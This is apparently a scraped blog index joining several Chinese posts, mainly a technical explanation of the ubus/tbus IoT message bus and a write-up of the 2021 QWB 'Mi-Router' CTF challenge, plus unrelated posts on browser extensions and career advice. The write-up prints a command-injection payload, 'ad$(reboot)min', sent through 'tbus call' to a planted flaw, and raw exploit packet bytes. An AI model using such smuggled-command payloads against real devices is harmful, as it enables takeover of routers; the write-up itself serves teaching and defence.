blob_put_int16 blob_put_u16 #define blob_put_int32 blob_put_u32 #define blob_put_int64 blob_put_u64 亦可使用blobmsg_add_xxx系列函数向blob_buf中添加blobmsg数据： int blobmsg_add_field(struct blob_buf *buf, int type, const char *name, const void *data, unsigned int len) static inline int blobmsg_add_u8(struct blob_buf *buf, const char *name, uint8_t val) static inline int blobmsg_add_u16(struct blob_buf *buf, const char *name, uint16_t val) static inline int blobmsg_add_u32(struct blob_buf *buf, const char *name, uint32_t val) static inline int blobmsg_add_u64(struct blob_buf *buf, const char *name, uint64_t val) static inline int blobmsg_add_string(struct blob_buf *buf, const char *name, const char *string) static inline int blobmsg_add_blob(struct blob_buf *buf, struct blob_attr *attr) ","date":"2021-12-04","objectID":"/zh-cn/5/:5:3","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"blob数据解析与获取 当receiver收到消息时，需要解析原始数据为blob数据。blob数据的解析可以用blobmsg_parse()函数实现，该函数原型如下： /** * 从data (blob_attr)中根据policy策略过滤，得到的结果存储在tb (blob_attr数组)中 * * @param policy 过滤策略 * @param policy_len 策略个数 * @param tb 返回blob_attr数据 * @param len data长度 */ int blobmsg_parse(const struct blobmsg_policy *policy, int policy_len, struct blob_attr **tb, void *data, unsigned int len) 该函数负责解析发来的blob数据（data参数，blob_attr格式），并将数据分解至blob_attr数组中（tb参数），供后续数据获取。解析数据时需根据策略进行（第一个参数policy），该参数在receiver中提前定义好，为blobmsg_policy结构体，结构体中的每一项对应一个name-type结构，其中name标识了blobmsg的name（在blobmsg的blobmsg_hdr中），type为对应的类型（在blob_attr的id_len中）。policy可按照如下的模板进行定义： static const struct blobmsg_policy foo_policy[] = { [FOO_MESSAGE] = { .name = \"message\", .type = BLOBMSG_TYPE_STRING, }, [FOO_LIST] = { .name = \"list\", .type = BLOBMSG_TYPE_ARRAY, }, [FOO_TESTDATA] = { .name = \"testdata\", .type = BLOBMSG_TYPE_TABLE, }, }; blobmsg_parse()之后，可以通过遍历tb数组，获取各blob_attr中的数据。blob数据的获取可以用blob_get_xxx和blobmsg_get_xxx系列函数实现，在此不详述。 ","date":"2021-12-04","objectID":"/zh-cn/5/:5:4","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"3. 从ubus call命令的解析来观察blob数据的构建和发送 下面从ubus call命令的源码来观察blob数据是如何被构建和发送的。本节涉及到libubox和libubus两部分源码，其中libubus是负责处理ubus逻辑的，而libubox负责处理blob相关数据的。 ubus call命令可以向对应的object-\u003emethod发送数据，其格式如下： \u003e ubus call \u003cobject\u003e \u003cmethod\u003e [\u003cmessage\u003e] 其中object为receiver注册的对象名，method为receiver注册的方法名，message为要向该方法发送的消息数据，需要为JSON格式。ubus call命令由libubus中ubus_cli_call()函数处理，代码位于cli.c文件。 ","date":"2021-12-04","objectID":"/zh-cn/5/:6:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"总流程 首先来看ubus_cli_call()函数： /** * ubus call \u003cobject\u003e \u003cmethod\u003e [\u003cmessage\u003e] * * argv[0]为object名 * argv[1]为method名 * argv[2]为message内容 */ static int ubus_cli_call(struct ubus_context *ctx, int argc, char **argv) { uint32_t id; int ret; if (argc \u003c 2 || argc \u003e 3) return -2; blob_buf_init(\u0026b, 0); if (argc == 3 \u0026\u0026 !blobmsg_add_json_from_string(\u0026b, argv[2])) { if (!simple_output) fprintf(stderr, \"Failed to parse message data\\n\"); return -1; } ret = ubus_lookup_id(ctx, argv[0], \u0026id); if (ret) return ret; return ubus_invoke(ctx, id, argv[1], b.head, receive_call_result_data, NULL, timeout * 1000); } 该函数流程如下： 调用blob_buf_init()函数初始化全局blob_buf变量b 调用blobmsg_add_json_from_string函数将JSON格式的message参数内容转换为JSON对象，并添加到全局变量b中 调用ubus_lookip_id()函数，向ubusd发起请求，以获取object对应的id值（32位） 调用ubus_invoke()函数，构建请求数据，发送至ubusd，等待响应 这里在分析时遇到一个小问题：ubus_cli_call()函数在一开始调用了blob_buf_init()初始化了全局变量b，并紧接着将message的内容保存在了b中，但是之后在调用ubus_lookup_id()时，再次调用到ubus_buf_init对全局变量b进行了初始化，那不就将之前已保存的message抹去了？经过分析发现，这里的全局变量b是静态全局变量，该类型的变量只在当前.c文件中有效，无法跨文件调用。而ubus_cli_call()函数位于cli.c，ubus_lookup_id()函数位于libubus.c，两个.c文件中均有各自的static struct blob_buf b，因此它们属于不同的变量，完全无需担心上述问题。 ","date":"2021-12-04","objectID":"/zh-cn/5/:6:1","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"请求并获取object id 继续分析。首先来看ubus_lookup_id()函数： int ubus_lookup_id(struct ubus_context *ctx, const char *path, uint32_t *id) { struct ubus_request req; blob_buf_init(\u0026b, 0); if (path) blob_put_string(\u0026b, UBUS_ATTR_OBJPATH, path); // UBUS_ATTR_OBJPATH为消息属性，会被添加至b-\u003eid_len当中，path拷贝至b-\u003edata if (ubus_start_request(ctx, \u0026req, b.head, UBUS_MSG_LOOKUP, 0) \u003c 0) return UBUS_STATUS_INVALID_ARGUMENT; req.raw_data_cb = ubus_lookup_id_cb; req.priv = id; return ubus_complete_request(ctx, \u0026req, 0); } 该函数作用为：向ubusd发送查询请求，查询目标object对应的id值。首先调用blob_put_string()将object的名字添加进全局blob_buf当中，之后即可调用ubus_start_request()函数发送请求。在每次调用ubus_start_request()函数时，会在message首部添加一个ubus_msghdr结构： struct ubus_msghdr { uint8_t version; uint8_t type; uint16_t seq; uint32_t peer; } __packetdata; 该结构共8字节，其中第二个字节type标识了本次发送的消息类型，ubus消息类型共有如下几种： enum ubus_msg_type { /* initial server message */ UBUS_MSG_HELLO, /* generic command response */ UBUS_MSG_STATUS, /* data message response */ UBUS_MSG_DATA, /* ping request */ UBUS_MSG_PING, /* look up one or more objects */ UBUS_MSG_LOOKUP, /* invoke a method on a single object */ UBUS_MSG_INVOKE, UBUS_MSG_ADD_OBJECT, UBUS_MSG_REMOVE_OBJECT, /* * subscribe/unsubscribe to object notifications * The unsubscribe message is sent from ubusd when * the object disappears */ UBUS_MSG_SUBSCRIBE, UBUS_MSG_UNSUBSCRIBE, /* * send a notification to all subscribers of an object. * when sent from the server, it indicates a subscription * status change */ UBUS_MSG_NOTIFY, UBUS_MSG_MONITOR, /* must be last */ __UBUS_MSG_LAST, }; 可以看到，第5个值UBUS_MSG_LOOKUP即为ubus_lookup_id()函数发送请求时使用的消息类型，表示当前消息是一个请求查询object id的消息。 在这8个字节的msghdr之后，即为要发送的blob_attr数据部分。总的消息格式如下： 请求后从ubusd处返回object对应的id值（4字节），保存至ubus_cli_call()函数的id参数中。至此，ubus_lookup_id()函数的使命完成。 ","date":"2021-12-04","objectID":"/zh-cn/5/:6:2","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"发送消息到对应的object-\u003emethod 接下来，ubus_invoke()函数负责处理整个消息的构建和发送。该函数最终会调用ubus_invoke_async_fd()函数，该函数定义如下： int ubus_invoke_async_fd(struct ubus_context *ctx, uint32_t obj, const char *method, struct blob_attr *msg, struct ubus_request *req, int fd) { blob_buf_init(\u0026b, 0); // 初始化blob_buf blob_put_int32(\u0026b, UBUS_ATTR_OBJID, obj); // 添加object id blob_put_string(\u0026b, UBUS_ATTR_METHOD, method); // 添加method字符串 ubus_put_data(\u0026b, msg); // 添加message memset(req, 0, sizeof(*req)); req-\u003efd = fd; if (__ubus_start_request(ctx, req, b.head, UBUS_MSG_INVOKE, obj) \u003c 0) return UBUS_STATUS_INVALID_ARGUMENT; return 0; } 在初始化blob_buf之后，该函数分别将三个blob_attr添加到blob_buf中，依次是上一步获取的object id（int32）、method字符串（string）以及经过JSON解析后的message（blobmsg）。最后函数调用__ubus_start_request()函数，发送整个消息，消息指针为b.head，该函数在构建ubus_msghdr时，会将收到的没有经过网络字节序转换的4字节object id放入ubus_msghdr-\u003epeer中。总的消息格式如下： 和源码流程相同，消息中主要包含了三部分数据：object id blob_attr，method blob_attr以及message blob_attr（blobmsg格式）。消息被发送到ubusd之后，ubusd会根据object id找到对应的receiver，并将消息发送给该程序。receiver根据object和method找到对应的处理例程，解析消息，需要时将结果返回。至此，ubus call的整个工作流程结束。 ","date":"2021-12-04","objectID":"/zh-cn/5/:6:3","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"4. 从2021强网杯Mi-Router观察ubus可能带来的安全问题 Mi-Router是2021年强网杯的一道Real World题目，选手需找寻出题人预埋的漏洞并获取系统的控制权。具体的解题思路可以参考如下博客，本文只对其中涉及ubus的知识点和安全问题进行剖析： 强网杯 2021 线下 RW Mi Router QWB-2021-Final:RealWorld MiRouter WriteUp 漏洞产生的原因，是因为/usr/lib/lua/traffic.lua脚本的cmdfmt函数被出题人删除了对“$”符号的转义，导致攻击者可以向脚本中的trafficd_lua_ecos_pair_verify()函数注入恶意命令，实现命令执行。利用grep命令全局搜索，可找到traffic.lua脚本被/usr/sbin/trafficd和/usr/sbin/netapi两个程序加载，然而只有netapi程序调用了trafficd_lua_ecos_pair_verify()函数，因此我们的目标就是要找到如何向netapi程序的处理函数发送恶意消息。 这里提个与ubus无关的知识点。经过分析，可以发现该函数只有在路由器发现了小米自己家信号放大器设备时才会触发，也就是说，要正常触发到这个逻辑，需要用户把一个小米信号放大器和路由器绑定。小米信号放大器如下图所示，插在路由器后面的USB口，即可通过手机APP进行配对和绑定。 ","date":"2021-12-04","objectID":"/zh-cn/5/:7:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"tbus和ubus 在小米路由器中，开发者使用了一种称作tbus的机制。其中/usr/sbin/trafficd为bus的服务端，负责处理消息注册和分发，其它一些进程如netapi注册相应的object和method等待消息，或者发送消息。但是与ubus不同的是，tbus并不通过Unix socket进行通信，而是通过TCP socket通信，由/usr/sbin/trafficd开放784端口实现数据的交互。如netapi程序在注册时，是向784端口发送注册数据的，而不是走Unix socket。和ubus相同，tbus也有一个客户端程序/usr/sbin/tbus，它向trafficd服务端发送数据时也走784端口。那么tbus和ubus究竟有什么不同？**经过分析发现，tbus基本上完全使用了ubus源码进行开发，只不过把Unix socket换成了TCP socket。**其实libubox是支持使用其它socket类型的，这在libubox的usock()函数可以看出来： #define USOCK_SERVER 0x0100 #define USOCK_NOCLOEXEC 0x0200 #define USOCK_NONBLOCK 0x0400 #define USOCK_NUMERIC 0x0800 #define USOCK_IPV6ONLY 0x2000 #define USOCK_IPV4ONLY 0x4000 #define USOCK_UNIX 0x8000 // 并且usock函数（在libubox）似乎也是支持其它类型socket的： int usock(int type, const char *host, const char *service) { int sock; if (type \u0026 USOCK_UNIX) // 如果是USOCK_UNIX sock = usock_unix(type, host); else // 如果是其它类型socket sock = usock_inet(type, host, service, NULL); if (sock \u003c 0) return -1; return sock; } 然而在ubus中，只能使用Unix socket实现通信，具体处理函数在ubus_reconnect()中： int ubus_reconnect(struct ubus_context *ctx, const char *path) { ....... // ubus连接服务端。如果path为NULL，则自动默认连接ubus unix socket // 路径为\"/var/run/ubus/ubus.sock\" if (!path) path = UBUS_UNIX_SOCKET; ....... ctx-\u003esock.eof = false; ctx-\u003esock.error = false; // 这里并没有区分USOCK_UNIX和其它类型的sock，统一用了USOCK_UNIX ctx-\u003esock.fd = usock(USOCK_UNIX, path, NULL); } ","date":"2021-12-04","objectID":"/zh-cn/5/:7:1","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"netapi程序解析blob数据 从netapi程序入手，来看数据是如何发送到traffic.lua脚本的。 通过字符串追踪可以找到处理函数sub_402070()，函数内的日志打印告诉我们该函数名可能为trafficd_lua_ecos_pair()。 该函数加载了traffic.lua脚本，并调用了脚本中存在漏洞的trafficd_lua_ecos_pair_verify()函数，传入的参数为v14变量。 v14变量可以追踪到v31，该变量为blobmsg_parse函数的第三个参数。从上文介绍blobmsg_parse函数参数可以得知，该参数为解析后的blob_attr数组，同时，函数的解析需根据第一个参数policy进行，并且由第二个参数可知，policy中只有1项。查看policy： 可以看出，policy唯一的一项，name为“data”，type为0，表示BLOBMSG_TYPE_UNSPEC。这里为什么是UNSPEC类型，我猜测可能是netapi并不能确定传进来的值究竟是什么type。 已经明白netapi是如何处理blob消息的，那么就要想办法构建blob消息，并通过784端口将数据直接发送到trafficd，转发至netapi。 ","date":"2021-12-04","objectID":"/zh-cn/5/:7:2","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"netapi程序注册object和method 接下来，我们需要搞明白netapi注册的object和method是什么，才能通过设备内部的tbus call命令发送请求消息，获取数据包。在做题时，我们队是通过tbus命令请求消息抓包，并通过流量逆向成功复现出流程，但是对于数据包内容的含义并不完全清楚。预期解是把设备内部的tbus程序拖出来，通过qemu模拟直接在远程执行tbus call命令，这种方法不用考虑数据包格式，本文不再讨论。 netapi程序的main函数调用了sub_40478C()函数进行object注册，通过对比ubus源码，可以判断该函数其实就是ubus中的ubus_add_object()，我们姑且称该函数为tbus_add_object()。该函数第二个参数为要注册的ubus_object，其结构如下： struct ubus_object { struct avl_node avl; // 28 bytes const char *name; uint32_t id; const char *path; struct ubus_object_type *type; ubus_state_handler_t subscribe_cb; bool has_subscribers; const struct ubus_method *methods; int n_methods; }; 为了使用 ubus call 命令，我们需要关注的只有两项：object名和method名。在该数据结构中，第二个元素name即为object，而第八个元素methods为方法数组的指针，第九个元素告诉我们有几个方法。通过添加数据结构，我们将tbus_add_object()函数的第二个参数设置为ubus_object格式，并查看内存： 可以看出，object名为“netapi”，methods中只有一个method，名为init，并且method的policy指向了上节图中的policy。 至此，我们已经可以构建tbus call命令了： tbus call netapi init {“data”:} 其中message可以填入我们注入的命令，如： tbus call netapi init {“data”:”ad$(reboot)min”} ","date":"2021-12-04","objectID":"/zh-cn/5/:7:3","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"数据包解析 由于我们没有想到把tbus程序拉出来执行，因此只在程序内部执行，并抓TCP 784端口包并复现流量，实现命令注入。在做题时并没有时间仔细分析数据格式，现在可根据本章第三节的部分对比二进制数据，研究各字段含义。现场抓包时，TCP会话中发送方一共发送了两个数据包，由第三节的描述可知，这两个数据包分别为object lookup和message消息发送，其中object lookup是为了向服务端查询object id并返回。 object lookup数据包解析 二进制内容为： 0004010000000000000000100200000b6e65746170690000 对比object id请求时的blob数据格式： 其中第一个id_len中len为16，但是总长度其实只有15（4+4+len(“netapi”)+1），这其实是因为blob中的数据需要4字节对齐。 message消息发送时数据包解析 二进制内容为： 00050200 + [object id (reverse)] + 0000003403000008 + [object id] + 04000009696e6974000000000700001c830000150004646174610000746573742031323300000000 对比message发送时blob数据格式： ","date":"2021-12-04","objectID":"/zh-cn/5/:7:4","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"5. 思考 与上述MQTT漏洞类似，该漏洞也是由于设备开放了TCP端口，接收总线数据，而漏洞点并不位于监听端口的程序，而是总线客户端。对于攻击者来说，只需要知道消息接收端程序所注册的object、method以及消息策略（类似MQTT中的topic），即可伪造sender程序向端口发送恶意消息，从而触发消息接收端的漏洞。ubus使用的是Unix socket，本不会开放任何TCP端口，然而由于开发人员为了实现设备间的通信，将端口开放在外，给了外部攻击者可乘之机。 尽管ubus消息发送端和接收端使用了Unix socket进行通信，但是ubus消息发送端所发送的消息并不一定是完全不可控的。当其它接口的处理程序（如处理HTTP数据的cgi）调用了ubus命令或者ubus API发送它们从外部接口（如HTTP端口）所接收到的数据，就可能带来新的安全问题。攻击者可以将恶意消息注入至外部接口，使这些程序将恶意消息传递到ubus的消息接收端，从而触发漏洞。 0x03 总结 消息总线机制极大方便了开发人员实现进程间和设备间通信，但是由于消息的接收端和发送端在一定程度上被解耦合，对于消息接收端来说，很难知道消息发送者的真实身份，一旦总线服务端缺乏鉴权机制，攻击者就可以伪造消息发送端发送恶意消息，触发接收端的解析漏洞。因此，设备开发者在开发程序时，应避免将总线服务端接口暴露在外，并尽可能减少敏感信息（如系统命令）的传输，保证总线系统中传输的数据安全可靠。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-04","objectID":"/zh-cn/5/:8:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["扩展分享"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 扩展分享 浏览器中的扩展能够帮助我们获得更好的上网体验，可以说没有扩展的浏览器就没得灵魂。但是有一个很尴尬的事情就是，现在很多人对插件和扩展两者混为一谈，事实上二者天差地别。 ","date":"2021-12-04","objectID":"/zh-cn/4-2/:0:0","tags":["扩展分享"],"title":"扩展分享","uri":"/zh-cn/4-2/"},{"categories":["扩展分享"],"content":"插件和扩展 插件：在功能上，插件通常是用来渲染页面里的 或 标签。 插件通常用操作系统的本地代码（也叫“原生代码”）编写，可以调用操作系统的 API。 形式上，插件以动态库（Windows 上就是 DLL 文件）的方式，加载到浏览器的进程内。由于使用本地代码编写， 插件通常依赖于特定的操作系统（不同系统的插件不能混用）。 举例： Flash 插件 媒体播放器插件 PDF 插件 Java 插件 各种网银控件 扩展：　扩展，顾名思义，是用来扩展浏览器自身的功能。所以， 扩展可以调用浏览器自身的 API，但是扩展通常不能调用操作系统的 API。 一般来说，扩展是跟操作系统无关的。比如 Firefox 的大部分扩展， 既可以用于 Windows 平台的 Firefox，也可以用于 Linux 和 Mac OS X 的 Firefox。 还有，当我们在Chrome中分别输入Chrome://plugins和Chrome://extensions时候给我们的页面也完全不一样。 这是输入plugins后给出的页面 这是输入extensions后给出的页面 很显然，现在Chrome已经停止了对于类似于Flash这类插件的支持，但是扩展功能支持一直都在。所以插件和扩展是完完全全的两码事儿。 ","date":"2021-12-04","objectID":"/zh-cn/4-2/:0:1","tags":["扩展分享"],"title":"扩展分享","uri":"/zh-cn/4-2/"},{"categories":["扩展分享"],"content":"我的扩展 下面我说说自己浏览器上那些离不开的扩展吧！ ADguard 这是一个广告过滤扩展，能够帮你过滤掉网站上你不想看到的广告，当然，也可以完美过滤YouTube视频中的广告（本人亲测有效）。广告过滤扩展那么多，有这一个就够了。 Dark Reader 这是一个“护眼扩展”，通过这个扩展你可以轻松的将大部分网页渲染成黑色，以此来达到降低夜间白色背景光对眼睛的刺激。 bitwarden 这是一款开源的密码管理软件。开源的密码软件不在少数，但是这个上手就比较简单。跨平台，无论你是Windows，MacOS，Linux，都可以使用，扩展几乎覆盖所有的主流浏览器，IOS和Android还有对应的客户端。 privacy Badger 这是一个自动学习并且能够阻止网页上不可见追踪器的扩展。 Randrom User-Agent 自动随机的改变用户的浏览器头部信息，减少被刻画用户画像的风险。 Pocket 将自己想要稍后阅读或者是自己喜欢的文章，网页收藏起来。算是一个收集箱，不开源。 PopupOFF 阻止顽固的网页弹窗和多余的页面边缘元素，提升阅读和浏览体验。 Clearurls 一款开源扩展，去除url中的跟踪元素，保护个人隐私。 Tampermonkey 浏览器中功能最强大的扩展，能够配合Greasy fork这个脚本网站实现各种各样的功能，逐渐不开源。 Disconnet 能够提升网页的响应速度，阻止网页追踪器，保护上网安全。 IDM 这是一个多线程的下载扩展（需要付费），能够自动嗅探资源，断点恢复下载，多线程 高速下载，下载大文件用它就对了，不开源。 WebRTC Leak Prevent 禁用自己浏览器上的webRTC，保护自己的真实IP不泄露。 webRTC检测 ——一个用来检测webRTC有没有泄露你真实IP的网站，没有泄露则webRTC处没有IP显示。 网站管理员可以轻易地通过WebRTC看到用户的真实IP地址，即使用户使用VPN来隐藏自己的IP，也可以被追踪到。 解决方法 Mozilla Firefox 在地址栏输入 “about:config”，搜“media.peerconnection.enabled” 并双击将值改为 “false”，WebRTC 将被关闭。 Google Chrome 在谷歌应用商店安装谷歌官方扩展 “WebRTC Leak Prevent”，在扩展选项里找到 “IP handling policy”选择第三项 “Disable non-proxied UDP”，并点击下方 “Apply settings”。只要是采用chromium内核的浏览器都可以使用此方法。 当然，最后你还可以对你的浏览器进行一波儿指纹独特性测试，无论结果是什么都仅供参考。 ","date":"2021-12-04","objectID":"/zh-cn/4-2/:0:2","tags":["扩展分享"],"title":"扩展分享","uri":"/zh-cn/4-2/"},{"categories":["扩展分享"],"content":"最后 以上这些扩展基本都可以在chrome的网上商店中找到（IDM除外），只要是采用了chromium内核的浏览器都可以使用。现在主流的浏览器中采用chromium内核的有：Chrome，Microsoft Edge，Brave，Yandex，Opera，Vivaldi，Firefox可以直接在扩展商店搜索名字。 以上扩展多为开源扩展，非开源扩展我已经特别说明了。 不要过分相信这些外在的工具，他们的作用毕竟是有限的，只有不断强大自身，学会远离危险，保护自己，才是最好，最有效的措施。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-04","objectID":"/zh-cn/4-2/:0:3","tags":["扩展分享"],"title":"扩展分享","uri":"/zh-cn/4-2/"},{"categories":["突破"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 很多事情看起来是特别清晰的，一步、两步、三步，把这几个步骤走完了，事情也就结束了；与其说清晰，还不如说简单吧，特别是业务性的工作，真的是一眼可以望到尽头。我们必须承认，工作很多时候是需要用点蛮力的，你拥有再多的技能，在受限的环境下，也难以施展开来。**所谓的脏活、苦活、累活，你不想去做，但是也得去做，因为那是成就你的一部分内容，可能你的运气好一点，这种活有人替你扛下来了。 如何在看似恶劣的环境中存活下来，然后逐步拔高呢？下面我列举了几个常规性问题和操作，以促进思考： 1、思考不足 在工作中的执行属性过强，对问题缺乏深度的思考，简单点说，就是问「为什么」问的太少了，在问题过来的时候，我们必须搞清楚为什么背后的为什么，打破砂锅问到底。写作是一个很好的弥补措施，thinking in writing，写的过程就会促使自己去整理和思考。 2、视野不够 只能看到自己的问题，只能看到当下的问题，缺乏横向和纵向的比较。遇到问题，多看看别人是怎么处理的，想一想自己做的东西别人可以如何利用，既要走出去又要领进来。 3、底蕴不强 解决的大多数问题都是简单问题，挥一挥手打个补丁就结束了，很少去思考共性问题，缺乏服务意识和产品化能力。这一点并不难突破，在多思考和总结的基础上，多一些耐心，咬定青山不放松，在难啃的骨头上多啃几下，很多事情就可以拨开云雾见青天了。 上限和下限 最近看到一个不错的观点，说努力决定你的下限，而选择决定了你的上限，我觉得说的有一定的道理。 作为一个技术人，扎实的基础和丰富的经验是行业立命之本，在这一块是绝对虚不得的，必须花费大把的努力，让自己的根基更加夯实。 而选择，伴随了太多的不确定性，运气显得有点重要，但是我想说的是，尽可能地提升自己，让自己成为别人的首选项，才能给自己争取更多的议价能力，坑有的时候就那么几个，争取让自己成为萝卜。 ","date":"2021-12-04","objectID":"/zh-cn/4-1/:0:0","tags":["突破"],"title":"为什么无法突破到下一个层级？","uri":"/zh-cn/4-1/"},{"categories":["方法"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 忙着找方法，没时间做事情 二狗子是个兴趣广泛的人，他特别喜欢琢磨新鲜玩意儿。 有一天二狗子突然想学习拍照了，于是买了一个 Sony 微单，发现默认摄像头是个定焦的，适合拍拍风景，于是又买了个 sigma 摄像头，拍拍人物，紧接着学习了一大堆光圈控制技能和拍摄技巧，然后把摄像机放到抽屉里吃灰了，至今没有拿出来 🤪 二狗子觉得之所以没有拍出好看的照片，还是相机过于笨重，不便于随身携带，而且操作起来特别麻烦，几个摄像头换来换去也容易把人搞烦躁。有一天他看到了同事买了个大疆无人机，经常在朋友圈发好看的视频。二狗子有点心动了，心想：“嗯，看起来还不错，这玩意儿能飞，肯定可以提起兴趣！”，于是二狗子又买了个大疆 Air。还别说，确实是个不错的玩具，嗖的一下就飞上了几千米的高空，啪的一下又稳稳地降了下来，还有各种跟随模式、环绕模式，确实可以拍出不少有趣的内容，于是二狗子把三块电池都足足地充满了电，然后放在抽屉里继续吃灰去了，至今没有拿出来 🤪 为什么大疆依然没有发挥作用呢？二狗子也反思过，大疆的续航能力太差了，而且组装、展开需要半天时间，再加上飞行技巧不是特别熟悉，在复杂的地形地域上也不敢乱飞，所以 Air 根本也没有太多用武之地。不过，在逛大疆官网的时候，二狗子瞥见到了一款十分有意思的产品，它叫做 osmo pocket，是一款小巧灵动的手持云台相机，“简直是 vlog 拍摄神器啊！”，二话不多说，买了一台回来了。这玩意儿确实不错，真的是小，而且配合手机可以拍出很多炫酷又有动感的视频，为了让可操行更强，二狗子还买齐了 osmo 的所有配件。果然，这一次不放在抽屉里吃灰了，而是……躺尸在了书包里 🤪 二狗子依然没有停止思考，为何单反、大疆无人机和手持迷你云台都没有被充分利用起来呢？不过这似乎也不是那么重要了，因为……已经有新的东西入了二狗子的法眼。 二狗子的故事，每天都发生在我们的身边。我们对环境的要求很高，对自己的要求却很低，我们将自己武装到了牙齿，遇到了敌人却依然是缴械投降，我们忙着找方法，却忘记了做事情才是我们最原始的初心。 你可以看到这类人，当他们搞清楚了一件事情的始末以后，就再也不想把他做出来了，因为他热爱的是接触新事物的过程，一旦觉得自己可以完全掌控，那么事情本身就不再那么重要。 所以啊，一定要搞清楚什么才是真正的价值，手段不是目的，手段只是达成目的的一种方法 ，不管用什么手段，都不要忘记最快地把事情落地才是最重要的，事情未落地，再漂亮的手段也不过是过眼云烟。 注：本文的二狗子所经历的事情就是作者本人所经历的事情，共勉 🤪 ","date":"2021-12-04","objectID":"/zh-cn/4/:0:0","tags":["方法"],"title":"忙着找方法，没时间做事情","uri":"/zh-cn/4/"},{"categories":["导师"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 给自己找个导师 什么是 mentor，可以简单地理解成引路人、导师，一般这个人在综合能力和视野上比你优秀一些，他可以在你职业发展之路上提供有用的建议和帮助。 ","date":"2021-12-03","objectID":"/zh-cn/4-3/:0:0","tags":["导师"],"title":"给自己找个导师","uri":"/zh-cn/4-3/"},{"categories":["导师"],"content":"寻找导师 走进一个偌大的林子里，谁是老鸟，谁是雏儿，仅凭声音你是听不出来的，当你刚踏进一家公司的时候，人生地不熟，社交圈子就身边的几个人，如何去找到一位能够帮助你，并且愿意帮助你的人，似乎并不是那么容易。 导师，并不需要他每天在你身边晃来晃去，保持一个中短期的低密度联系即可，3~6 个月时间，或者 1 年左右，因为你的阶段性成长和沉淀一般也需要这么长的周期拿到结果；当然，你也可以跟导师建立深厚的友谊，让这个关系保持得更久一些。 那么，如何去寻找适合自己的导师呢？ 首先，你的 Leader 一定是你最好的导师，你们是一个利益共同体，他有义务对你的职业发展负责，而你也可以毫无顾忌地向他发起求助，另外，你们之间最有可能发展出深刻的友谊关系。但是 Leader 的两个局限性是： 他是局中人，你跟 Leader 之间发现的问题具有同质性，视野是有限的 他可能很忙，作为一个 Leader，需要对每个下属负责，他的精力很可能不够用，你不好一直打扰他 如果你觉得 Leader 给你的帮助还不够的话，你需要跳出团队，从外部寻求帮助，哪些人可以成为你的导师呢？另外一个挖掘点是，你的 Leader（或者你熟悉的与 Leader 